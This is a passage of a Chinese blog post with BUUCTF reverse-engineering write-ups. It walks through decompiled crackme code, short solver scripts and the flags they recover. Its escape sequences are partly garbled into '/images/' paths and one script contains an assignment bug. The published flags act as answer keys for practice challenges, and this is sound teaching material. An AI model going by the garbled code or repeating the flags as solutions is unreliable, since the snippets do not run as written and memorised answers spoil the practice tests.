class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">33</span>; ++i )</span><br><span class="line">    __b[i] ^= __b[i - <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(__b, global, <span class="number">0x21u</span>LL) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里逻辑相对来说比较简单，输入字符串之后，<code>str[i] ^= str[i-1]</code>，最终与字符串进行比较。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-xor_1.png"
                      alt="buuctf-xor_1"
                ><br>那我们写一个脚本解密一下：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag = [<span class="number">0x66</span>, <span class="number">0x0A</span>, <span class="number">0x6B</span>, <span class="number">0x0C</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x4F</span>, <span class="number">0x2E</span>,</span><br><span class="line">        <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0x78</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x3B</span>, <span class="number">0x55</span>, <span class="number">0x11</span>,</span><br><span class="line">        <span class="number">0x70</span>, <span class="number">0x19</span>, <span class="number">0x46</span>, <span class="number">0x1F</span>, <span class="number">0x76</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0x23</span>,</span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x0E</span>, <span class="number">0x67</span>, <span class="number">0x06</span>, <span class="number">0x68</span>, <span class="number">0x0F</span>, <span class="number">0x47</span>, <span class="number">0x32</span>,</span><br><span class="line">        <span class="number">0x4F</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    flag[i] ^= flag[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">flag_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(value) <span class="keyword">for</span> value <span class="keyword">in</span> flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;flag_str&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>flag{QianQiuWanDai_YiTongJiangHu}</p>
<h2 id="buuctf-reverse3"><a href="#buuctf-reverse3" class="headerlink" title="buuctf-reverse3"></a>buuctf-reverse3</h2><p>DIE查壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-reverse3.png"
                      alt="buuctf-reverse3"
                ><br>无壳，32位PE文件，C++编写。<br>IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+0h] [ebp-188h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+0h] [ebp-188h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> j; <span class="comment">// [esp+DCh] [ebp-ACh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+E8h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v11; <span class="comment">// [esp+E8h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">108</span>]; <span class="comment">// [esp+F4h] [ebp-94h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">28</span>]; <span class="comment">// [esp+160h] [ebp-28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">8</span>]; <span class="comment">// [esp+17Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)i &gt;= <span class="number">0x64</span> )</span><br><span class="line">      j____report_rangecheckfailure();</span><br><span class="line">    Destination[i] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please enter the flag:&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%20s&quot;</span>, (<span class="type">char</span>)Str);</span><br><span class="line">  v3 = j_strlen(Str);</span><br><span class="line">  v4 = (<span class="type">const</span> <span class="type">char</span> *)base64_encode((<span class="type">int</span>)Str, v3, (<span class="type">int</span>)v14);</span><br><span class="line">  <span class="built_in">strncpy</span>(Destination, v4, <span class="number">0x28u</span>);</span><br><span class="line">  v11 = j_strlen(Destination);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v11; ++j )</span><br><span class="line">    Destination[j] += j;</span><br><span class="line">  v5 = j_strlen(Destination);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Destination, Str2, v5) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rigth flag!/images/n&quot;</span>, v8);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wrong flag!/images/n&quot;</span>, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以看到逻辑还是比较清楚，输入字符串，base64加密之后<code>Destination[j] += j</code>，这里写一个脚本直接解密：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">encrypted_string = <span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> index,char <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_string):</span><br><span class="line">    flag.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(char) - index))</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line">flag = base64.b64decode(flag)</span><br><span class="line">flag = flag.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
<p>flag{i_l0ve_you}</p>
<h2 id="buuctf-helloworld"><a href="#buuctf-helloworld" class="headerlink" title="buuctf-helloworld"></a>buuctf-helloworld</h2><p>下载下来发现是apk逆向，没有接触过，不过之前打CTF的时候，有队友教我做apk的逆向，改后缀为zip之后，找一些东西，这里把后缀改为zip，解压，在classes.dex文件里面直接搜索到了flag：<br>flag{7631a988259a00816deda84afb29430a}</p>
<h2 id="buuctf-不一样的flag"><a href="#buuctf-不一样的flag" class="headerlink" title="buuctf-不一样的flag"></a>buuctf-不一样的flag</h2><p>DIE查壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag.png"
                      alt="buuctf-不一样的flag"
                ><br>无壳，32位PE文件，C语言编写。<br>IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v3[<span class="number">29</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE v7[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v3[<span class="number">26</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;v3[<span class="number">27</span>] = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;*11110100001010000101111#&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right/images/n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &gt;= <span class="number">5u</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="string">&#x27;#&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;/images/nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>看来是迷宫题了，根据代码，猜测这是一个<code>5*5</code>的迷宫：</p>
<blockquote>
<ul>
<li>1 1 1 1<br>0 1 0 0 0<br>0 1 0 1 0<br>0 0 0 1 0<br>1 1 1 1 #</li>
</ul>
</blockquote>
<p>自己走出：<br>下下下右右上上右右下下下<br>222441144222<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag_1.png"
                      alt="buuctf-不一样的flag_1"
                ><br>flag{222441144222}</p>
<h2 id="buuctf-SimpleRev"><a href="#buuctf-SimpleRev" class="headerlink" title="buuctf-SimpleRev"></a>buuctf-SimpleRev</h2><p>DIE查壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-SimpleRev.png"
                      alt="buuctf-SimpleRev"
                ><br>无壳，64位ELF文件，C语言编写。<br>IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Decry</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(_QWORD *)src = <span class="string">&#x27;SLCDN&#x27;</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9[<span class="number">0</span>] = <span class="string">&#x27;wodah&#x27;</span>;</span><br><span class="line">  v9[<span class="number">1</span>] = <span class="string">&#x27;/images/0&#x27;</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  text = join(key3, (<span class="type">const</span> <span class="type">char</span> *)v9);          <span class="comment">// killswodah</span></span><br><span class="line">  <span class="built_in">strcpy</span>(key, key1);                            <span class="comment">// ADSFKSLCDN</span></span><br><span class="line">  <span class="built_in">strcat</span>(key, src);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  getchar();</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="number">0x40</span> &amp;&amp; key[v3 % v5] &lt;= <span class="number">0x5A</span> )</span><br><span class="line">      key[i] = key[v3 % v5] + <span class="number">32</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;                                             <span class="comment">// adsfkslcdn</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="string">&#x27;/images/n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">          ++v3;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )                    <span class="comment">// killswodah</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!/images/n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!/images/n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>该程序逻辑较为复杂，首先是对Str1和Str2赋值，注意对于Str2有一个大小写转换的操作，然后需要我们输入数组，并根据输入，操作Str2，最后与Str1比较，这里写一个暴力破解脚本：</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> str1[] = <span class="string">&quot;killshadow&quot;</span>;</span><br><span class="line">	<span class="type">char</span> str2[] = <span class="string">&quot;adsfkndcls&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="built_in">strlen</span>(str1);i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">65</span>;j &lt; <span class="number">122</span>;j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> ((j - <span class="number">39</span> - str2[i] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span> == str1[i]) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, j);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>flag{KLDQCUDFZO}</p>
<h2 id="buuctf-images-GXYCTF2019-images-luck-guy"><a href="#buuctf-images-GXYCTF2019-images-luck-guy" class="headerlink" title="buuctf-&#x2F;images&#x2F;[GXYCTF2019&#x2F;images&#x2F;]luck_guy"></a>buuctf-&#x2F;images&#x2F;[GXYCTF2019&#x2F;images&#x2F;]luck_guy</h2><p>DIE查壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-luck_guy.png"
                      alt="buuctf-luck_guy"
                ><br>无壳，64位ELF文件，C语言编写，<br>IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  welcome(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;_________________&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;try to patch me and find flag&quot;</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input a lucky number&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  patch_me(v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK,see you again&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>主函数逻辑比较简单，告诉我们需要patch一个函数：<code>patch_me</code>函数。<br>patch_me函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">patch_me</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;just finished&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> get_flag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>看来，我们只需要patch文件，使其进入<code>get_flag</code>函数即可。<br>get_flag函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 s[<span class="number">5</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)s, f1);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">strcpy</span>((<span class="type">char</span> *)s, <span class="string">&quot;icug`of/images/x7F&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>观察<code>get_flag</code>函数，1是用来输出flag的，2和3分支没什么用，4分支是为f2（也就是flag的后半部分）赋值的，5是用来操作后半部分的。由于最开始给f2赋的值不是正确的，需要经过5的操作来使其变正确。</p>
<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>第一种我们可以patch文件，使其进入<code>get_flag</code>函数，然后将switch的值改为我们输入的值，即将<code>rand() % 200</code>patch为<code>getcahr</code>，然后尝试对f2进行操作。<br>第二种，我们不需要patch文件，自己写一个脚本去模拟对f2的操作即可，直到最后一个字符为<code>&#125;</code>即可。<br><strong>实际上，我们看到循环要5次，而赋值和输出各占一次，那操作的次数肯定是3次。</strong><br><em>额，后来发现这个思路不对，最多操作三次，实际上操作一次就正确了，需要使用那三个没用的占掉循环次数即可。</em><br>我这里是写了一个脚本：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;lucu_guy: &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="type">char</span> f1[] = <span class="string">&quot;GXY&#123;do_not_&quot;</span>;</span><br><span class="line"><span class="type">char</span> f2[] = &#123; <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="number">0x7F</span> &#125;;</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (j % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">			f2[j] -= <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			--f2[j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d/images/n&quot;</span>, a++);</span><br><span class="line">	<span class="keyword">if</span> (f2[<span class="built_in">strlen</span>(f2) - <span class="number">1</span>] = <span class="string">&#x27;&#125;&#x27;</span>)<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> flag[_MAX_PATH]&#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(flag, f1, <span class="built_in">strlen</span>(f1));</span><br><span class="line"><span class="built_in">strcat</span>(flag, f2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br></pre></td></tr></table></figure></div>
<p>GXY{do_not_hate_me}</p>
